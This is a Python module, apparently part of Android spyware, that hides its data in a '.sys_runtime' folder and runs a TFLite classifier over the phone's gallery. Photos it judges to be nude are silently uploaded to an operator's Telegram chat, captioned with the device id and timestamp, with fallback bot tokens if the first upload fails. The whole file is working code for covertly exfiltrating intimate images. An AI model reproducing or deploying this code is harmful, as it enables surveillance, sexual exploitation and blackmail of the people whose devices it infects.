# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import requests
from datetime import datetime

# ========== إعداد المسارات الموحدة (يتم تحميل الموديل من هنا) ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
MODELS_DIR = os.path.join(P, "models")
if not os.path.exists(MODELS_DIR):
    os.makedirs(MODELS_DIR)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات (tflite-runtime هو الأساس) ==========
AI_AVAILABLE = False
Interpreter = None

try:
    import numpy as np
    from PIL import Image, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000

    try:
        from tflite_runtime.interpreter import Interpreter
        AI_AVAILABLE = True
    except ImportError:
        logging.error("tflite_runtime not found. AI core disabled.")
        class Interpreter:
            pass
except ImportError as e:
    logging.error(f"Core libraries missing (numpy/Pillow): {e}")
    class Interpreter:
        pass


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0
        self._loading_engine = False

        self.model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        if AI_AVAILABLE:
            threading.Thread(target=self._load_engine_forever, daemon=True).start()
        else:
            logging.warning("AI libraries missing. NudeDetector inactive.")

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
                old = int(time.time()) - 30 * 86400
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحميل المحرك مع إعادة محاولة غير محدودة ==========
    def _load_engine_forever(self):
        if not AI_AVAILABLE or self._loading_engine:
            return
        self._loading_engine = True
        attempt = 0
        wait_time = 5

        while True:
            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
                try:
                    self.model = Interpreter(model_path=self.model_path, num_threads=4)
                    self.model.allocate_tensors()
                    inputs = self.model.get_input_details()
                    outputs = self.model.get_output_details()
                    self.in_idx = inputs[0]['index']
                    self.out_idx = outputs[0]['index']
                    logging.info("✅ TFLite engine loaded successfully from models directory")
                    self._loading_engine = False
                    return
                except Exception as e:
                    logging.error(f"Load engine error (attempt {attempt+1}): {e}")
                    self.model = None
                    wait_time = min(wait_time + 5, 60)
            else:
                if attempt % 6 == 0:
                    logging.info(f"Waiting for model file: {self.model_path} (attempt {attempt+1})")

            attempt += 1
            time.sleep(wait_time)

    # ========== تحميل سريع لمرة واحدة (للتوافق) ==========
    def _load_engine(self):
        if not AI_AVAILABLE or self.model is not None:
            return
        threading.Thread(target=self._load_engine_forever, daemon=True).start()

    # ========== تحليل صورة واحدة ==========
    def analyze(self, path):
        if not AI_AVAILABLE or self.model is None or not os.path.exists(path):
            return 0.0

        if os.path.getsize(path) > 8 * 1024 * 1024:
            return 0.0

        if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            return 0.0

        try:
            with Image.open(path) as raw_img:
                width, height = raw_img.size
                aspect_bonus = 0.05 if height > width * 1.2 else 0.0
                img = raw_img.convert('RGB').resize((224, 224), Image.BILINEAR)

            arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            prob = float(out[1]) if len(out) > 1 else float(out[0])
            prob = min(prob + aspect_bonus, 1.0)
            return prob
        except Exception as e:
            logging.error(f"Analyze error on {path}: {e}")
            return 0.0

    # ========== المسح التلقائي ==========
    def scan(self):
        if not AI_AVAILABLE or self.active:
            return

        if self.model is None:
            if not self._loading_engine:
                threading.Thread(target=self._load_engine_forever, daemon=True).start()
            return

        now = time.time()
        if (now - self.last_run) < 1800:
            return
        self.last_run = now
        threading.Thread(target=self._worker, daemon=True).start()

    def _worker(self):
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(self.mon, 'media_scanner', None)
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=30)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue

                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self.analyze(path)

                # عتبة إرسال محسنة (دمج prob > 0.85)
                send = False
                if prob > 0.85:  # دمج prob > 0.90 و prob > 0.85
                    send = True
                elif prob > 0.70 and hasattr(self.mon, '_battery_ok'):
                    bat, charging = self.mon._battery_ok()
                    if charging:
                        send = True

                if send:
                    sc.update_category(item.get("hash"), "nude", prob)
                    self._report(path, item.get("label", "??"), prob)
                elif prob > 0.45:
                    sc.update_category(item.get("hash"), "questionable", prob)
                else:
                    sc.update_category(item.get("hash"), "normal", prob)

                self._mark_cached(h)
                time.sleep(0.5)

        except Exception as e:
            logging.error(f"AI Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except:
            pass

    # ========== إرسال التقرير إلى Telegram ==========
    def _report(self, path, label, confidence):
        tg = getattr(self.mon, 'ui', None)
        if not tg or not os.path.exists(path):
            return

        caption = (f"🔞 **AI Detection**\n"
                   f"Label: `{label}`\n"
                   f"Confidence: `{confidence:.0%}`\n"
                   f"Device: `{self.mon.dmd}`\n"
                   f"Time: `{datetime.now().strftime('%H:%M:%S')}`")

        with open(path, 'rb') as f:
            res = tg._api("sendPhoto", {
                "chat_id": tg.dat,
                "caption": caption,
                "parse_mode": "Markdown",
                "disable_notification": True
            }, {"photo": f})

        if not res or not res.get('ok'):
            logging.warning("Primary bot failed, using fallback tokens...")
            for token in getattr(tg, 'active_tokens', []):
                try:
                    url = f"https://api.telegram.org/bot{token}/sendPhoto"
                    with open(path, 'rb') as f2:
                        fallback_res = requests.post(
                            url,
                            data={"chat_id": tg.dat, "caption": caption + "\n(Fallback)", "parse_mode": "Markdown"},
                            files={"photo": f2},
                            timeout=30
                        )
                        if fallback_res.json().get('ok'):
                            break
                except Exception:
                    continue


def create(mon=None):
    return NudeDetector(mon)
